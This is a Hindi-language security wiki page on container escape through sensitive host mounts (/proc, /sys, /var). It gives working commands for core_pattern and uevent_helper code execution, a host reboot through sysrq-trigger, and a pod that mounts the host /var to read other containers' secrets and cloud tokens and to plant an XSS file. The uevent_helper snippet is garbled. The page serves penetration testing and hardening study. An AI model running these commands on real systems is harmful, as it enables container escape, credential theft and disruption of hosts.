# Sensitive Mounts

{{#include ../../../../banners/hacktricks-training.md}}

`/proc`, `/sys`, और `/var` का उचित namespace isolation के बिना खुलासा महत्वपूर्ण सुरक्षा जोखिमों को जन्म देता है, जिसमें हमले की सतह का विस्तार और जानकारी का खुलासा शामिल है। ये निर्देशिकाएँ संवेदनशील फ़ाइलें रखती हैं जो, यदि गलत तरीके से कॉन्फ़िगर की गईं या किसी अनधिकृत उपयोगकर्ता द्वारा एक्सेस की गईं, तो कंटेनर से बाहर निकलने, होस्ट में संशोधन, या आगे के हमलों में मदद करने वाली जानकारी प्रदान कर सकती हैं। उदाहरण के लिए, `-v /proc:/host/proc` को गलत तरीके से माउंट करना AppArmor सुरक्षा को बायपास कर सकता है, जिससे `/host/proc` असुरक्षित रह जाता है।

**आप प्रत्येक संभावित vuln के बारे में और विवरण पा सकते हैं** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**।**

## procfs Vulnerabilities

### `/proc/sys`

यह निर्देशिका कर्नेल वेरिएबल्स को संशोधित करने की अनुमति देती है, आमतौर पर `sysctl(2)` के माध्यम से, और इसमें कई उपनिर्देशिकाएँ शामिल हैं:

#### **`/proc/sys/kernel/core_pattern`**

- [core(5)](https://man7.org/linux/man-pages/man5/core.5.html) में वर्णित।
- कोर-फ़ाइल उत्पन्न होने पर निष्पादित करने के लिए एक प्रोग्राम को परिभाषित करने की अनुमति देता है, जिसमें पहले 128 बाइट्स तर्क के रूप में होते हैं। यदि फ़ाइल एक पाइप `|` से शुरू होती है तो यह कोड निष्पादन का कारण बन सकता है।
- **परीक्षण और शोषण उदाहरण**:

```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Test write access
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # Set custom handler
sleep 5 && ./crash & # Trigger handler
```

#### **`/proc/sys/kernel/modprobe`**

- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) में विस्तृत।
- कर्नेल मॉड्यूल लोडर का पथ रखता है, जिसे कर्नेल मॉड्यूल लोड करने के लिए बुलाया जाता है।
- **एक्सेस जांचने का उदाहरण**:

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # Check access to modprobe
```

#### **`/proc/sys/vm/panic_on_oom`**

- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) में संदर्भित।
- एक वैश्विक ध्वज जो नियंत्रित करता है कि क्या कर्नेल पैनिक करता है या OOM किलर को बुलाता है जब OOM स्थिति होती है।

#### **`/proc/sys/fs`**

- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) के अनुसार, फ़ाइल प्रणाली के बारे में विकल्प और जानकारी रखता है।
- लिखने की अनुमति विभिन्न सेवा से इनकार के हमलों को सक्षम कर सकती है।

#### **`/proc/sys/fs/binfmt_misc`**

- मैजिक नंबर के आधार पर गैर-देशी बाइनरी प्रारूपों के लिए इंटरप्रेटर्स को पंजीकृत करने की अनुमति देता है।
- यदि `/proc/sys/fs/binfmt_misc/register` लिखा जा सकता है तो यह विशेषाधिकार वृद्धि या रूट शेल एक्सेस का कारण बन सकता है।
- प्रासंगिक शोषण और व्याख्या:
- [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
- गहन ट्यूटोरियल: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### Others in `/proc`

#### **`/proc/config.gz`**

- यदि `CONFIG_IKCONFIG_PROC` सक्षम है तो कर्नेल कॉन्फ़िगरेशन प्रकट कर सकता है।
- चल रहे कर्नेल में कमजोरियों की पहचान करने के लिए हमलावरों के लिए उपयोगी।

#### **`/proc/sysrq-trigger`**

- Sysrq कमांड को बुलाने की अनुमति देता है, संभावित रूप से तत्काल सिस्टम रिबूट या अन्य महत्वपूर्ण क्रियाएँ कर सकता है।
- **होस्ट को रिबूट करने का उदाहरण**:

```bash
echo b > /proc/sysrq-trigger # Reboots the host
```

#### **`/proc/kmsg`**

- कर्नेल रिंग बफर संदेशों को उजागर करता है।
- कर्नेल शोषण, पते के रिसाव में मदद कर सकता है, और संवेदनशील सिस्टम जानकारी प्रदान कर सकता है।

#### **`/proc/kallsyms`**

- कर्नेल द्वारा निर्यातित प्रतीकों और उनके पते की सूची बनाता है।
- कर्नेल शोषण विकास के लिए आवश्यक, विशेष रूप से KASLR को पार करने के लिए।
- पता जानकारी `kptr_restrict` को `1` या `2` पर सेट करने के साथ प्रतिबंधित है।
- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) में विवरण।

#### **`/proc/[pid]/mem`**

- कर्नेल मेमोरी डिवाइस `/dev/mem` के साथ इंटरफेस करता है।
- ऐतिहासिक रूप से विशेषाधिकार वृद्धि हमलों के लिए संवेदनशील।
- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) पर अधिक।

#### **`/proc/kcore`**

- सिस्टम की भौतिक मेमोरी को ELF कोर प्रारूप में दर्शाता है।
- पढ़ने से होस्ट सिस्टम और अन्य कंटेनरों की मेमोरी सामग्री लीक हो सकती है।
- बड़ी फ़ाइल का आकार पढ़ने की समस्याओं या सॉफ़्टवेयर क्रैश का कारण बन सकता है।
- [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/) में विस्तृत उपयोग।

#### **`/proc/kmem`**

- `/dev/kmem` के लिए वैकल्पिक इंटरफेस, कर्नेल वर्चुअल मेमोरी का प्रतिनिधित्व करता है।
- पढ़ने और लिखने की अनुमति देता है, इसलिए कर्नेल मेमोरी का प्रत्यक्ष संशोधन।

#### **`/proc/mem`**

- `/dev/mem` के लिए वैकल्पिक इंटरफेस, भौतिक मेमोरी का प्रतिनिधित्व करता है।
- पढ़ने और लिखने की अनुमति देता है, सभी मेमोरी का संशोधन वर्चुअल से भौतिक पते को हल करने की आवश्यकता है।

#### **`/proc/sched_debug`**

- प्रक्रिया शेड्यूलिंग जानकारी लौटाता है, PID namespace सुरक्षा को बायपास करता है।
- प्रक्रिया नाम, आईडी, और cgroup पहचानकर्ताओं को उजागर करता है।

#### **`/proc/[pid]/mountinfo`**

- प्रक्रिया के माउंट namespace में माउंट बिंदुओं के बारे में जानकारी प्रदान करता है।
- कंटेनर `rootfs` या छवि के स्थान को उजागर करता है।

### `/sys` Vulnerabilities

#### **`/sys/kernel/uevent_helper`**

- कर्नेल डिवाइस `uevents` को संभालने के लिए उपयोग किया जाता है।
- `/sys/kernel/uevent_helper` पर लिखने से `uevent` ट्रिगर होने पर मनमाने स्क्रिप्ट को निष्पादित किया जा सकता है।
- **शोषण का उदाहरण**: %%%bash

#### एक पेलोड बनाता है

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

#### कंटेनर के लिए OverlayFS माउंट से होस्ट पथ खोजता है

host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)

#### दुर्भावनापूर्ण सहायक के लिए uevent_helper सेट करता है

echo "$host_path/evil-helper" > /sys/kernel/uevent_helper

#### एक uevent ट्रिगर करता है

echo change > /sys/class/mem/null/uevent

#### आउटपुट पढ़ता है

cat /output %%%

#### **`/sys/class/thermal`**

- तापमान सेटिंग्स को नियंत्रित करता है, संभावित रूप से DoS हमलों या भौतिक क्षति का कारण बनता है।

#### **`/sys/kernel/vmcoreinfo`**

- कर्नेल पते लीक करता है, संभावित रूप से KASLR को खतरे में डालता है।

#### **`/sys/kernel/security`**

- `securityfs` इंटरफेस को रखता है, जो AppArmor जैसे Linux सुरक्षा मॉड्यूल की कॉन्फ़िगरेशन की अनुमति देता है।
- एक्सेस एक कंटेनर को अपने MAC सिस्टम को निष्क्रिय करने में सक्षम कर सकता है।

#### **`/sys/firmware/efi/vars` और `/sys/firmware/efi/efivars`**

- NVRAM में EFI वेरिएबल्स के साथ इंटरैक्ट करने के लिए इंटरफेस को उजागर करता है।
- गलत कॉन्फ़िगरेशन या शोषण से लैपटॉप को ब्रिक या अनबूटेबल होस्ट मशीनों का कारण बन सकता है।

#### **`/sys/kernel/debug`**

- `debugfs` कर्नेल के लिए "कोई नियम नहीं" डिबगिंग इंटरफेस प्रदान करता है।
- इसकी अनियंत्रित प्रकृति के कारण सुरक्षा मुद्दों का इतिहास है।

### `/var` Vulnerabilities

होस्ट का **/var** फ़ोल्डर कंटेनर रनटाइम सॉकेट और कंटेनरों की फ़ाइल सिस्टम को रखता है। यदि इस फ़ोल्डर को एक कंटेनर के अंदर माउंट किया जाता है, तो उस कंटेनर को अन्य कंटेनरों की फ़ाइल सिस्टम पर रूट विशेषाधिकारों के साथ पढ़ने-लिखने की अनुमति मिलेगी। इसका दुरुपयोग कंटेनरों के बीच पिवट करने, सेवा से इनकार करने, या अन्य कंटेनरों और उन पर चलने वाले अनुप्रयोगों में बैकडोर डालने के लिए किया जा सकता है।

#### Kubernetes

यदि इस तरह का एक कंटेनर Kubernetes के साथ तैनात किया जाता है:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: pod-mounts-var
labels:
app: pentest
spec:
containers:
- name: pod-mounts-var-folder
image: alpine
volumeMounts:
- mountPath: /host-var
name: noderoot
command: [ "/bin/sh", "-c", "--" ]
args: [ "while true; do sleep 30; done;" ]
volumes:
- name: noderoot
hostPath:
path: /var
```
**pod-mounts-var-folder** कंटेनर के अंदर:
```bash
/ # find /host-var/ -type f -iname '*.env*' 2>/dev/null

/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/201/fs/usr/src/app/.env.example
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/135/fs/docker-entrypoint.d/15-local-resolvers.envsh

/ # cat /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/105/fs/usr/src/app/.env.example | grep -i secret
JWT_SECRET=85d<SNIP>a0
REFRESH_TOKEN_SECRET=14<SNIP>ea

/ # find /host-var/ -type f -iname 'index.html' 2>/dev/null
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/57/fs/usr/src/app/node_modules/@mapbox/node-pre-gyp/lib/util/nw-pre-gyp/index.html
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/share/nginx/html/index.html
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/132/fs/usr/share/nginx/html/index.html

/ # echo '<!DOCTYPE html><html lang="en"><head><script>alert("Stored XSS!")</script></head></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/sh
are/nginx/html/index2.html
```
The XSS was achieved:

![Stored XSS via mounted /var folder](/images/stored-xss-via-mounted-var-folder.png)

ध्यान दें कि कंटेनर को पुनः प्रारंभ करने की आवश्यकता नहीं है या कुछ भी। **/var** फ़ोल्डर के माध्यम से किए गए किसी भी परिवर्तन तुरंत लागू होंगे।

आप स्वचालित (या अर्ध-स्वचालित) RCE प्राप्त करने के लिए कॉन्फ़िगरेशन फ़ाइलें, बाइनरी, सेवाएँ, अनुप्रयोग फ़ाइलें और शेल प्रोफाइल भी बदल सकते हैं।

##### Access to cloud credentials

The container can read K8s serviceaccount tokens or AWS webidentity tokens
which allows the container to gain unauthorized access to K8s or cloud:
```bash
/ # cat /host-var/run/secrets/kubernetes.io/serviceaccount/token
/ # cat /host-var/run/secrets/eks.amazonaws.com/serviceaccount/token
```
#### Docker

Docker (या Docker Compose तैनातियों) में शोषण बिल्कुल वही है, सिवाय इसके कि आमतौर पर अन्य कंटेनरों की फ़ाइल सिस्टम एक अलग आधार पथ के तहत उपलब्ध होती हैं:
```bash
$ docker info | grep -i 'docker root\|storage driver'
Storage Driver: overlay2
Docker Root Dir: /var/lib/docker
```
तो फाइल सिस्टम `/var/lib/docker/overlay2/` के अंतर्गत हैं:
```bash
$ sudo ls -la /var/lib/docker/overlay2

drwx--x---  4 root root  4096 Jan  9 22:14 00762bca8ea040b1bb28b61baed5704e013ab23a196f5fe4758dafb79dfafd5d
drwx--x---  4 root root  4096 Jan 11 17:00 03cdf4db9a6cc9f187cca6e98cd877d581f16b62d073010571e752c305719496
drwx--x---  4 root root  4096 Jan  9 21:23 049e02afb3f8dec80cb229719d9484aead269ae05afe81ee5880ccde2426ef4f
drwx--x---  4 root root  4096 Jan  9 21:22 062f14e5adbedce75cea699828e22657c8044cd22b68ff1bb152f1a3c8a377f2
<SNIP>
```
#### नोट

वास्तविक पथ विभिन्न सेटअप में भिन्न हो सकते हैं, यही कारण है कि आपका सबसे अच्छा विकल्प **find** कमांड का उपयोग करना है ताकि अन्य कंटेनरों की फ़ाइल सिस्टम को खोजा जा सके।

### संदर्भ

- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
- [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
- [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)

{{#include ../../../../banners/hacktricks-training.md}}
